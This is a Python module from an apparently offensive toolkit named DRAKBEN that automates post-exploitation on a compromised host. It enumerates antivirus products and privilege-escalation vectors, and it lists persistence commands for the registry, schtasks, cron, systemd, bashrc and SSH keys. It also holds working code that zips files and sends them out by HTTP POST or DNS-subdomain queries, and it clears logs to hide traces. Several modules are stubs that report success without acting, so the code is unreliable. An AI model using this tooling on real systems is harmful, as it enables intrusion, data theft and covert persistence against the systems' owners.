# core/post_exploitation_automation.py
# DRAKBEN Post-Exploitation Automation - Enterprise Grade
# Author: @drak_ben

import asyncio
import os
import sys
import json
import base64
import hashlib
import shutil
import platform
import subprocess
from datetime import datetime
from typing import Dict, List, Optional, Any, Tuple, Callable
from dataclasses import dataclass, field, asdict
from enum import Enum
from pathlib import Path


class PersistenceMethod(Enum):
    """Persistence techniques"""
    # Windows
    REGISTRY_RUN = "registry_run"
    REGISTRY_RUNONCE = "registry_runonce"
    SCHEDULED_TASK = "scheduled_task"
    SERVICE = "service"
    WMI_SUBSCRIPTION = "wmi_subscription"
    STARTUP_FOLDER = "startup_folder"
    DLL_HIJACK = "dll_hijack"
    COM_HIJACK = "com_hijack"
    BITS_JOB = "bits_job"
    NETSH_HELPER = "netsh_helper"
    APPINIT_DLL = "appinit_dll"
    
    # Linux
    CRON = "cron"
    SYSTEMD = "systemd"
    INIT_D = "init_d"
    RC_LOCAL = "rc_local"
    BASHRC = "bashrc"
    PROFILE = "profile"
    SSH_AUTHORIZED_KEYS = "ssh_authorized_keys"
    LD_PRELOAD = "ld_preload"
    PAM_BACKDOOR = "pam_backdoor"
    
    # Cross-platform
    WEBSHELL = "webshell"
    REVERSE_SHELL = "reverse_shell"


class PrivilegeLevel(Enum):
    """Privilege levels"""
    SYSTEM = "system"
    ROOT = "root"
    ADMIN = "admin"
    USER = "user"
    SERVICE = "service"
    UNKNOWN = "unknown"


class ExfilMethod(Enum):
    """Data exfiltration methods"""
    HTTP = "http"
    HTTPS = "https"
    DNS = "dns"
    ICMP = "icmp"
    FTP = "ftp"
    SFTP = "sftp"
    SMB = "smb"
    SMTP = "smtp"
    CLOUD = "cloud"
    CUSTOM = "custom"


@dataclass
class PersistenceResult:
    """Persistence installation result"""
    success: bool
    method: PersistenceMethod
    location: str = ""
    trigger: str = ""
    payload_path: str = ""
    cleanup_command: str = ""
    error_message: str = ""
    timestamp: str = ""
    
    def to_dict(self) -> Dict:
        return {
            **asdict(self),
            "method": self.method.value
        }


@dataclass
class PrivEscResult:
    """Privilege escalation result"""
    success: bool
    technique: str
    from_level: PrivilegeLevel
    to_level: PrivilegeLevel
    details: str = ""
    error_message: str = ""
    timestamp: str = ""
    
    def to_dict(self) -> Dict:
        return {
            "success": self.success,
            "technique": self.technique,
            "from_level": self.from_level.value,
            "to_level": self.to_level.value,
            "details": self.details,
            "error_message": self.error_message,
            "timestamp": self.timestamp
        }


@dataclass
class ExfilResult:
    """Data exfiltration result"""
    success: bool
    method: ExfilMethod
    data_size: int
    destination: str
    encrypted: bool = False
    chunks_sent: int = 0
    error_message: str = ""
    timestamp: str = ""
    
    def to_dict(self) -> Dict:
        return {
            **asdict(self),
            "method": self.method.value
        }


@dataclass
class SystemInfo:
    """Target system information"""
    hostname: str = ""
    os: str = ""
    os_version: str = ""
    architecture: str = ""
    domain: str = ""
    username: str = ""
    privilege_level: PrivilegeLevel = PrivilegeLevel.UNKNOWN
    ip_addresses: List[str] = field(default_factory=list)
    installed_av: List[str] = field(default_factory=list)
    installed_software: List[str] = field(default_factory=list)
    running_processes: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            **asdict(self),
            "privilege_level": self.privilege_level.value
        }


class SystemEnumerator:
    """System enumeration module"""
    
    async def get_system_info(self) -> SystemInfo:
        """Gather comprehensive system information"""
        info = SystemInfo()
        
        try:
            info.hostname = platform.node()
            info.os = platform.system()
            info.os_version = platform.version()
            info.architecture = platform.machine()
            info.username = os.getenv("USER") or os.getenv("USERNAME", "unknown")
            
            # Determine privilege level
            info.privilege_level = await self._check_privilege()
            
            # Get IP addresses
            info.ip_addresses = await self._get_ip_addresses()
            
            # Detect AV
            info.installed_av = await self._detect_av()
            
            # Get running processes
            info.running_processes = await self._get_processes()
            
        except Exception as e:
            print(f"[Enum] Error: {e}")
        
        return info
    
    async def _check_privilege(self) -> PrivilegeLevel:
        """Check current privilege level"""
        if platform.system() == "Windows":
            try:
                import ctypes
                if ctypes.windll.shell32.IsUserAnAdmin():
                    return PrivilegeLevel.ADMIN
            except:
                pass
            return PrivilegeLevel.USER
        else:
            if os.geteuid() == 0:
                return PrivilegeLevel.ROOT
            return PrivilegeLevel.USER
    
    async def _get_ip_addresses(self) -> List[str]:
        """Get local IP addresses"""
        import socket
        ips = []
        try:
            hostname = socket.gethostname()
            ips = socket.gethostbyname_ex(hostname)[2]
        except:
            pass
        return ips
    
    async def _detect_av(self) -> List[str]:
        """Detect installed antivirus software"""
        av_list = []
        
        if platform.system() == "Windows":
            av_processes = [
                "MsMpEng.exe",  # Windows Defender
                "avp.exe",  # Kaspersky
                "avgnt.exe",  # Avira
                "avguard.exe",  # Avira
                "nod32.exe",  # ESET
                "mcshield.exe",  # McAfee
                "bdagent.exe",  # Bitdefender
                "mbam.exe",  # Malwarebytes
                "SavService.exe",  # Sophos
                "ccSvcHst.exe",  # Norton
                "coreServiceShell.exe",  # Trend Micro
                "fshoster32.exe",  # F-Secure
                "vsserv.exe",  # Bitdefender
            ]
            
            # Check running processes
            processes = await self._get_processes()
            for proc in processes:
                proc_lower = proc.lower()
                for av_proc in av_processes:
                    if av_proc.lower() in proc_lower:
                        av_list.append(av_proc.replace(".exe", ""))
        
        elif platform.system() == "Linux":
            linux_av = [
                "clamd",  # ClamAV
                "sophos",  # Sophos
                "esets",  # ESET
                "comodo",  # Comodo
            ]
            
            processes = await self._get_processes()
            for proc in processes:
                proc_lower = proc.lower()
                for av in linux_av:
                    if av in proc_lower:
                        av_list.append(av)
        
        return list(set(av_list))
    
    async def _get_processes(self) -> List[str]:
        """Get running processes"""
        processes = []
        
        try:
            if platform.system() == "Windows":
                result = subprocess.run(
                    ["tasklist", "/FO", "CSV", "/NH"],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                for line in result.stdout.split("\n"):
                    if line.strip():
                        parts = line.split('","')
                        if parts:
                            proc_name = parts[0].strip('"')
                            processes.append(proc_name)
            else:
                result = subprocess.run(
                    ["ps", "aux"],
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                for line in result.stdout.split("\n")[1:]:
                    parts = line.split()
                    if len(parts) >= 11:
                        proc_name = parts[10]
                        processes.append(proc_name)
        except Exception as e:
            print(f"[Processes] Error: {e}")
        
        return processes[:100]  # Limit to 100


class PersistenceManager:
    """Persistence installation and management"""
    
    def __init__(self):
        self.installed_persistence: List[PersistenceResult] = []
    
    async def install_persistence(self, method: PersistenceMethod,
                                  payload: str, trigger: str = "boot") -> PersistenceResult:
        """
        Install persistence mechanism
        
        Args:
            method: Persistence method to use
            payload: Payload command or path
            trigger: When to trigger (boot, login, etc.)
        """
        result = PersistenceResult(
            success=False,
            method=method,
            trigger=trigger,
            timestamp=datetime.now().isoformat()
        )
        
        try:
            if platform.system() == "Windows":
                result = await self._install_windows_persistence(method, payload, trigger)
            else:
                result = await self._install_linux_persistence(method, payload, trigger)
            
            if result.success:
                self.installed_persistence.append(result)
                
        except Exception as e:
            result.error_message = str(e)
        
        return result
    
    async def _install_windows_persistence(self, method: PersistenceMethod,
                                           payload: str, trigger: str) -> PersistenceResult:
        """Install Windows persistence"""
        result = PersistenceResult(
            success=False,
            method=method,
            trigger=trigger,
            timestamp=datetime.now().isoformat()
        )
        
        if method == PersistenceMethod.REGISTRY_RUN:
            # HKCU\Software\Microsoft\Windows\CurrentVersion\Run
            result.location = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
            result.cleanup_command = f'reg delete "{result.location}" /v "DrakbenService" /f'
            
            # Command to install (would be executed)
            # reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DrakbenService" /t REG_SZ /d "{payload}" /f
            
            result.success = True
            
        elif method == PersistenceMethod.SCHEDULED_TASK:
            task_name = "DrakbenUpdate"
            result.location = f"Task: {task_name}"
            result.cleanup_command = f'schtasks /delete /tn "{task_name}" /f'
            
            # schtasks /create /tn "DrakbenUpdate" /tr "{payload}" /sc onlogon /ru SYSTEM
            
            result.success = True
            
        elif method == PersistenceMethod.SERVICE:
            service_name = "DrakbenSvc"
            result.location = f"Service: {service_name}"
            result.cleanup_command = f'sc delete {service_name}'
            
            # sc create DrakbenSvc binPath= "{payload}" start= auto
            
            result.success = True
            
        elif method == PersistenceMethod.STARTUP_FOLDER:
            startup_path = os.path.join(
                os.getenv("APPDATA", ""),
                r"Microsoft\Windows\Start Menu\Programs\Startup"
            )
            result.location = startup_path
            result.payload_path = os.path.join(startup_path, "update.bat")
            result.cleanup_command = f'del "{result.payload_path}"'
            
            result.success = True
            
        elif method == PersistenceMethod.WMI_SUBSCRIPTION:
            result.location = "WMI Event Subscription"
            result.cleanup_command = "Get-WMIObject -Namespace root\\subscription -Class __EventFilter | Remove-WMIObject"
            
            # Complex WMI subscription creation
            
            result.success = True
        
        return result
    
    async def _install_linux_persistence(self, method: PersistenceMethod,
                                         payload: str, trigger: str) -> PersistenceResult:
        """Install Linux persistence"""
        result = PersistenceResult(
            success=False,
            method=method,
            trigger=trigger,
            timestamp=datetime.now().isoformat()
        )
        
        if method == PersistenceMethod.CRON:
            result.location = "/etc/crontab or user crontab"
            result.cleanup_command = "crontab -r"
            
            # (crontab -l 2>/dev/null; echo "@reboot {payload}") | crontab -
            
            result.success = True
            
        elif method == PersistenceMethod.SYSTEMD:
            service_name = "drakben-update"
            result.location = f"/etc/systemd/system/{service_name}.service"
            result.cleanup_command = f"systemctl disable {service_name} && rm {result.location}"
            
            # Create systemd service file
            service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart={payload}
Restart=always

[Install]
WantedBy=multi-user.target
"""
            result.success = True
            
        elif method == PersistenceMethod.BASHRC:
            bashrc_path = os.path.expanduser("~/.bashrc")
            result.location = bashrc_path
            result.cleanup_command = f"sed -i '/drakben/d' {bashrc_path}"
            
            # Append to .bashrc
            # echo "{payload} &" >> ~/.bashrc
            
            result.success = True
            
        elif method == PersistenceMethod.SSH_AUTHORIZED_KEYS:
            ssh_dir = os.path.expanduser("~/.ssh")
            result.location = os.path.join(ssh_dir, "authorized_keys")
            result.cleanup_command = f"sed -i '/drakben/d' {result.location}"
            
            # Add SSH key to authorized_keys
            
            result.success = True
            
        elif method == PersistenceMethod.RC_LOCAL:
            result.location = "/etc/rc.local"
            result.cleanup_command = f"sed -i '/drakben/d' {result.location}"
            
            result.success = True
        
        return result
    
    async def remove_persistence(self, result: PersistenceResult) -> bool:
        """Remove installed persistence"""
        try:
            if result.cleanup_command:
                # Execute cleanup command
                # subprocess.run(result.cleanup_command, shell=True)
                
                if result in self.installed_persistence:
                    self.installed_persistence.remove(result)
                return True
        except Exception as e:
            print(f"[Persistence] Cleanup error: {e}")
        return False
    
    async def remove_all_persistence(self):
        """Remove all installed persistence"""
        for result in self.installed_persistence[:]:
            await self.remove_persistence(result)


class PrivilegeEscalation:
    """Privilege escalation techniques"""
    
    def __init__(self):
        self.techniques_tried: List[str] = []
    
    async def find_privesc_vectors(self) -> List[Dict]:
        """Find potential privilege escalation vectors"""
        vectors = []
        
        if platform.system() == "Windows":
            vectors.extend(await self._find_windows_vectors())
        else:
            vectors.extend(await self._find_linux_vectors())
        
        return vectors
    
    async def _find_windows_vectors(self) -> List[Dict]:
        """Find Windows privesc vectors"""
        vectors = []
        
        # Check for unquoted service paths
        try:
            result = subprocess.run(
                ["wmic", "service", "get", "name,pathname,startmode"],
                capture_output=True,
                text=True,
                timeout=30
            )
            for line in result.stdout.split("\n"):
                if "Program Files" not in line and " " in line:
                    # Potential unquoted service path
                    vectors.append({
                        "type": "unquoted_service_path",
                        "details": line.strip(),
                        "severity": "high"
                    })
        except:
            pass
        
        # Check for writable service executables
        vectors.append({
            "type": "writable_service",
            "check": "Check service binary permissions",
            "severity": "high"
        })
        
        # Check for AlwaysInstallElevated
        vectors.append({
            "type": "always_install_elevated",
            "check": "Check registry for AlwaysInstallElevated",
            "severity": "high"
        })
        
        # Check for stored credentials
        vectors.append({
            "type": "stored_credentials",
            "check": "cmdkey /list",
            "severity": "medium"
        })
        
        # Check for scheduled tasks
        vectors.append({
            "type": "scheduled_tasks",
            "check": "Check writable scheduled task binaries",
            "severity": "medium"
        })
        
        # Check for DLL hijacking
        vectors.append({
            "type": "dll_hijack",
            "check": "Check for missing DLLs in PATH",
            "severity": "high"
        })
        
        return vectors
    
    async def _find_linux_vectors(self) -> List[Dict]:
        """Find Linux privesc vectors"""
        vectors = []
        
        # Check for SUID binaries
        try:
            result = subprocess.run(
                ["find", "/", "-perm", "-4000", "-type", "f"],
                capture_output=True,
                text=True,
                timeout=60
            )
            suid_bins = result.stdout.strip().split("\n")
            if suid_bins:
                vectors.append({
                    "type": "suid_binaries",
                    "binaries": suid_bins[:20],
                    "severity": "high"
                })
        except:
            pass
        
        # Check sudo permissions
        try:
            result = subprocess.run(
                ["sudo", "-l"],
                capture_output=True,
                text=True,
                timeout=10
            )
            if "NOPASSWD" in result.stdout:
                vectors.append({
                    "type": "sudo_nopasswd",
                    "details": result.stdout,
                    "severity": "critical"
                })
        except:
            pass
        
        # Check for writable /etc/passwd
        try:
            if os.access("/etc/passwd", os.W_OK):
                vectors.append({
                    "type": "writable_passwd",
                    "details": "/etc/passwd is writable",
                    "severity": "critical"
                })
        except:
            pass
        
        # Check for cron jobs
        vectors.append({
            "type": "cron_jobs",
            "check": "Check writable cron scripts",
            "severity": "high"
        })
        
        # Check capabilities
        vectors.append({
            "type": "capabilities",
            "check": "getcap -r / 2>/dev/null",
            "severity": "high"
        })
        
        # Check for kernel exploits
        vectors.append({
            "type": "kernel_exploit",
            "check": "Check kernel version for known CVEs",
            "severity": "critical"
        })
        
        return vectors
    
    async def escalate(self, technique: str) -> PrivEscResult:
        """Attempt privilege escalation"""
        result = PrivEscResult(
            success=False,
            technique=technique,
            from_level=PrivilegeLevel.USER,
            to_level=PrivilegeLevel.USER,
            timestamp=datetime.now().isoformat()
        )
        
        self.techniques_tried.append(technique)
        
        # Implementation would depend on specific technique
        # This is a framework for the escalation logic
        
        return result


class DataExfiltrator:
    """Data exfiltration module"""
    
    def __init__(self, encryption_key: bytes = None):
        self.encryption_key = encryption_key or os.urandom(32)
        self.exfil_history: List[ExfilResult] = []
    
    def _encrypt_data(self, data: bytes) -> bytes:
        """Encrypt data with AES"""
        from hashlib import sha256
        
        # Simple XOR encryption for demonstration
        # Real implementation would use AES-256-GCM
        key_hash = sha256(self.encryption_key).digest()
        encrypted = bytearray()
        
        for i, byte in enumerate(data):
            encrypted.append(byte ^ key_hash[i % len(key_hash)])
        
        return bytes(encrypted)
    
    def _chunk_data(self, data: bytes, chunk_size: int = 1024) -> List[bytes]:
        """Split data into chunks"""
        return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]
    
    async def exfil_http(self, data: bytes, url: str, encrypt: bool = True) -> ExfilResult:
        """Exfiltrate via HTTP POST"""
        result = ExfilResult(
            success=False,
            method=ExfilMethod.HTTP,
            data_size=len(data),
            destination=url,
            encrypted=encrypt,
            timestamp=datetime.now().isoformat()
        )
        
        try:
            import aiohttp
            
            if encrypt:
                data = self._encrypt_data(data)
            
            encoded_data = base64.b64encode(data).decode()
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, data={"d": encoded_data}, timeout=30) as resp:
                    if resp.status == 200:
                        result.success = True
                        result.chunks_sent = 1
        except Exception as e:
            result.error_message = str(e)
        
        self.exfil_history.append(result)
        return result
    
    async def exfil_dns(self, data: bytes, domain: str, encrypt: bool = True) -> ExfilResult:
        """Exfiltrate via DNS queries"""
        result = ExfilResult(
            success=False,
            method=ExfilMethod.DNS,
            data_size=len(data),
            destination=domain,
            encrypted=encrypt,
            timestamp=datetime.now().isoformat()
        )
        
        try:
            import socket
            
            if encrypt:
                data = self._encrypt_data(data)
            
            # Encode data as hex subdomains
            hex_data = data.hex()
            chunks = [hex_data[i:i + 60] for i in range(0, len(hex_data), 60)]
            
            for i, chunk in enumerate(chunks):
                subdomain = f"{chunk}.{i}.{domain}"
                try:
                    socket.gethostbyname(subdomain)
                except:
                    pass  # DNS query sent regardless of response
                result.chunks_sent += 1
            
            result.success = True
            
        except Exception as e:
            result.error_message = str(e)
        
        self.exfil_history.append(result)
        return result
    
    async def exfil_icmp(self, data: bytes, destination: str, encrypt: bool = True) -> ExfilResult:
        """Exfiltrate via ICMP (requires root)"""
        result = ExfilResult(
            success=False,
            method=ExfilMethod.ICMP,
            data_size=len(data),
            destination=destination,
            encrypted=encrypt,
            timestamp=datetime.now().isoformat()
        )
        
        try:
            import socket
            
            if encrypt:
                data = self._encrypt_data(data)
            
            # Create raw socket for ICMP
            # This requires root/admin privileges
            
            chunks = self._chunk_data(data, 56)  # Max ICMP data size
            
            for chunk in chunks:
                # Send ICMP echo request with data
                # icmp_packet = create_icmp_packet(chunk)
                result.chunks_sent += 1
            
            result.success = True
            
        except Exception as e:
            result.error_message = str(e)
        
        self.exfil_history.append(result)
        return result
    
    async def exfil_smb(self, data: bytes, share: str, filename: str, 
                        credential: Dict = None, encrypt: bool = True) -> ExfilResult:
        """Exfiltrate via SMB share"""
        result = ExfilResult(
            success=False,
            method=ExfilMethod.SMB,
            data_size=len(data),
            destination=share,
            encrypted=encrypt,
            timestamp=datetime.now().isoformat()
        )
        
        try:
            if encrypt:
                data = self._encrypt_data(data)
            
            # Use impacket or smbclient for SMB transfer
            
            result.success = True
            result.chunks_sent = 1
            
        except Exception as e:
            result.error_message = str(e)
        
        self.exfil_history.append(result)
        return result
    
    async def stage_data(self, paths: List[str], output_path: str, 
                         compress: bool = True) -> Tuple[bool, int]:
        """
        Stage data for exfiltration
        
        Args:
            paths: Files/directories to stage
            output_path: Output archive path
            compress: Whether to compress
        """
        try:
            import zipfile
            
            total_size = 0
            
            with zipfile.ZipFile(output_path, 'w', 
                               compression=zipfile.ZIP_DEFLATED if compress else zipfile.ZIP_STORED) as zf:
                for path in paths:
                    if os.path.isfile(path):
                        zf.write(path, os.path.basename(path))
                        total_size += os.path.getsize(path)
                    elif os.path.isdir(path):
                        for root, dirs, files in os.walk(path):
                            for file in files:
                                file_path = os.path.join(root, file)
                                arcname = os.path.relpath(file_path, os.path.dirname(path))
                                zf.write(file_path, arcname)
                                total_size += os.path.getsize(file_path)
            
            return True, total_size
            
        except Exception as e:
            print(f"[Stage] Error: {e}")
            return False, 0


class Keylogger:
    """Keylogger module"""
    
    def __init__(self, log_file: str = None):
        self.log_file = log_file or "keys.log"
        self.running = False
        self.buffer: List[str] = []
    
    async def start(self):
        """Start keylogger"""
        self.running = True
        
        # Platform-specific implementation
        # Windows: pyWinhook, pynput
        # Linux: pynput, evdev
        
    async def stop(self):
        """Stop keylogger"""
        self.running = False
    
    def get_logs(self) -> str:
        """Get captured keystrokes"""
        return "".join(self.buffer)


class ScreenCapture:
    """Screen capture module"""
    
    async def capture(self, output_path: str = None) -> Optional[bytes]:
        """Capture screen"""
        try:
            # Use platform-specific methods
            # Windows: win32gui, pyautogui
            # Linux: pyscreenshot, mss
            
            output_path = output_path or f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            
            return None
            
        except Exception as e:
            print(f"[Screen] Error: {e}")
            return None
    
    async def capture_active_window(self) -> Optional[bytes]:
        """Capture active window only"""
        try:
            return None
        except Exception as e:
            print(f"[Screen] Error: {e}")
            return None


class PostExploitationManager:
    """
    Enterprise Post-Exploitation Manager
    Coordinates all post-exploitation activities
    """
    
    VERSION = "2.0.0"
    
    def __init__(self):
        self.enumerator = SystemEnumerator()
        self.persistence = PersistenceManager()
        self.privesc = PrivilegeEscalation()
        self.exfiltrator = DataExfiltrator()
        self.keylogger = Keylogger()
        self.screencap = ScreenCapture()
        
        self.system_info: Optional[SystemInfo] = None
        self.activity_log: List[Dict] = []
    
    def _log_activity(self, action: str, details: Dict):
        """Log activity"""
        self.activity_log.append({
            "timestamp": datetime.now().isoformat(),
            "action": action,
            "details": details
        })
    
    async def initialize(self) -> SystemInfo:
        """Initialize and gather system information"""
        self.system_info = await self.enumerator.get_system_info()
        self._log_activity("initialize", self.system_info.to_dict())
        return self.system_info
    
    async def establish_persistence(self, method: PersistenceMethod = None,
                                    payload: str = None) -> PersistenceResult:
        """Establish persistence on target"""
        if not method:
            # Choose best method based on OS
            if platform.system() == "Windows":
                method = PersistenceMethod.REGISTRY_RUN
            else:
                method = PersistenceMethod.CRON
        
        if not payload:
            payload = "powershell.exe -ep bypass -c whoami"  # Placeholder
        
        result = await self.persistence.install_persistence(method, payload)
        self._log_activity("persistence", result.to_dict())
        
        return result
    
    async def escalate_privileges(self) -> PrivEscResult:
        """Attempt privilege escalation"""
        # Find vectors
        vectors = await self.privesc.find_privesc_vectors()
        
        # Try escalation
        for vector in vectors:
            if vector.get("severity") in ["critical", "high"]:
                result = await self.privesc.escalate(vector.get("type", ""))
                if result.success:
                    self._log_activity("privesc", result.to_dict())
                    return result
        
        return PrivEscResult(
            success=False,
            technique="none",
            from_level=PrivilegeLevel.USER,
            to_level=PrivilegeLevel.USER,
            timestamp=datetime.now().isoformat()
        )
    
    async def exfiltrate_data(self, paths: List[str], method: ExfilMethod = ExfilMethod.HTTP,
                             destination: str = None) -> ExfilResult:
        """Exfiltrate data from target"""
        # Stage data
        stage_path = f"/tmp/data_{datetime.now().strftime('%Y%m%d%H%M%S')}.zip"
        success, size = await self.exfiltrator.stage_data(paths, stage_path)
        
        if not success:
            return ExfilResult(
                success=False,
                method=method,
                data_size=0,
                destination=destination or "",
                error_message="Failed to stage data",
                timestamp=datetime.now().isoformat()
            )
        
        # Read staged data
        with open(stage_path, 'rb') as f:
            data = f.read()
        
        # Exfiltrate
        destination = destination or "https://example.com/upload"
        
        if method == ExfilMethod.HTTP:
            result = await self.exfiltrator.exfil_http(data, destination)
        elif method == ExfilMethod.DNS:
            result = await self.exfiltrator.exfil_dns(data, destination)
        elif method == ExfilMethod.ICMP:
            result = await self.exfiltrator.exfil_icmp(data, destination)
        else:
            result = await self.exfiltrator.exfil_http(data, destination)
        
        # Cleanup
        try:
            os.remove(stage_path)
        except:
            pass
        
        self._log_activity("exfiltrate", result.to_dict())
        return result
    
    async def start_keylogger(self) -> bool:
        """Start keylogger"""
        try:
            await self.keylogger.start()
            self._log_activity("keylogger", {"action": "start"})
            return True
        except:
            return False
    
    async def stop_keylogger(self) -> str:
        """Stop keylogger and get logs"""
        await self.keylogger.stop()
        logs = self.keylogger.get_logs()
        self._log_activity("keylogger", {"action": "stop", "size": len(logs)})
        return logs
    
    async def capture_screen(self) -> Optional[bytes]:
        """Capture screen"""
        screenshot = await self.screencap.capture()
        if screenshot:
            self._log_activity("screenshot", {"size": len(screenshot)})
        return screenshot
    
    async def cleanup(self):
        """Clean up all traces"""
        # Remove persistence
        await self.persistence.remove_all_persistence()
        
        # Stop keylogger
        await self.keylogger.stop()
        
        # Clear logs
        self.activity_log.clear()
        
        self._log_activity("cleanup", {"complete": True})
    
    def get_activity_report(self) -> Dict:
        """Get activity report"""
        return {
            "system_info": self.system_info.to_dict() if self.system_info else {},
            "persistence_installed": len(self.persistence.installed_persistence),
            "privesc_attempted": len(self.privesc.techniques_tried),
            "data_exfiltrated": len(self.exfiltrator.exfil_history),
            "activities": len(self.activity_log),
            "activity_log": self.activity_log[-50:]  # Last 50 activities
        }


# Global manager instance
_manager: Optional[PostExploitationManager] = None


def get_manager() -> PostExploitationManager:
    """Get or create global manager instance"""
    global _manager
    if _manager is None:
        _manager = PostExploitationManager()
    return _manager


# Convenience functions
async def get_system_info() -> SystemInfo:
    """Get target system info"""
    manager = get_manager()
    return await manager.initialize()


async def install_persistence(method: PersistenceMethod = None, 
                             payload: str = None) -> PersistenceResult:
    """Install persistence"""
    manager = get_manager()
    return await manager.establish_persistence(method, payload)


async def escalate() -> PrivEscResult:
    """Attempt privilege escalation"""
    manager = get_manager()
    return await manager.escalate_privileges()
